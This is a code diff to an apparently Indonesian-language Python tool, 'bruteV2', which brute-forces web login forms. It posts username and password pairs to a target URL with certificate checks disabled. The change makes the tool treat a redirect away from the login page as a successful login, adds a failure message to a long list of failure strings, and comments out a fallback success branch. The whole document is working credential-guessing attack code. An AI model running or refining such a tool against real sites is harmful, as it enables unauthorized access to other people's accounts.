@@ -34,19 +34,20 @@ def bruteV2():
                 urllib3.disable_warnings()
                 data_dict = {Parameter1:username,Parameter2:password}
                 req = requests.post(link_target, verify = False,headers = headers, data=data_dict,allow_redirects=True)
-                validasi = link_target != req.url
-                if(validasi == True):
+                validasi = link_target == req.url
+                check = bool(validasi)
+                if(check == False):
                     print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ",Style.RESET_ALL,password, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,req.status_code)
                     break
-                elif('tidak' in str(req.content) or 'failed!' in str(req.content) or 'User'  in str(req.content) or  'Nama' in str(req.content) or 'Telah terjadi error:' in str(req.content) or 'Email harus berupa alamat surel yang valid.' in str(req.content) or 'error' in str(req.content) or 'Telah' in str(req.content) or 'Email' in str(req.content) or 'Identitas tersebut tidak cocok dengan data kami.' in str(req.content) or 'tidak' in str(req.content) or 'aktif ' in str(req.content) or 'Acount' in str(req.content) or 'Email' in str(req.content) or 'The Email field must contain a valid email address.' in str(req.content) or 'Incorrect username or password.' in str(req.content) or 'Incorrect' in str(req.content) or 'salah' in str(req.content) or  'Username atau Password salah' in str(req.content) or 'Username tidak ditemukan' in str(req.content) or 'Password yang anda masukan salah' in str(req.content) or 'Username atau Password Salah' in str(req.content) or 'Username Salah' in str(req.content) or 'Password Salah' in str(req.content) or 'Username Belum Terdaftar' in str(req.content)):
+                elif('Username Atau Password Salah' in str(req.content) or 'tidak' in str(req.content) or 'failed!' in str(req.content) or 'User'  in str(req.content) or  'Nama' in str(req.content) or 'Telah terjadi error:' in str(req.content) or 'Email harus berupa alamat surel yang valid.' in str(req.content) or 'error' in str(req.content) or 'Telah' in str(req.content) or 'Email' in str(req.content) or 'Identitas tersebut tidak cocok dengan data kami.' in str(req.content) or 'tidak' in str(req.content) or 'aktif ' in str(req.content) or 'Acount' in str(req.content) or 'Email' in str(req.content) or 'The Email field must contain a valid email address.' in str(req.content) or 'Incorrect username or password.' in str(req.content) or 'Incorrect' in str(req.content) or 'salah' in str(req.content) or  'Username atau Password salah' in str(req.content) or 'Username tidak ditemukan' in str(req.content) or 'Password yang anda masukan salah' in str(req.content) or 'Username atau Password Salah' in str(req.content) or 'Username Salah' in str(req.content) or 'Password Salah' in str(req.content) or 'Username Belum Terdaftar' in str(req.content)):
                     print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL,req.status_code)
                 elif(int(req.status_code) == 302):
                     print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL,req.status_code)                   
                 elif(int(req.status_code) == 400):
                      print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL,req.status_code)                               
-                else:
-                    print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ",Style.RESET_ALL,password, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,req.status_code)
-                    break
+                #else:
+                    #print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ",Style.RESET_ALL,password, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,req.status_code)
+                    #break
                 #link = req.url
                 #simpan_log = "Username {} Password {} Website {}\n".format(u,u,link)
                 #log = open("./log/bruteV1/{}.txt".format(file_name),'a')
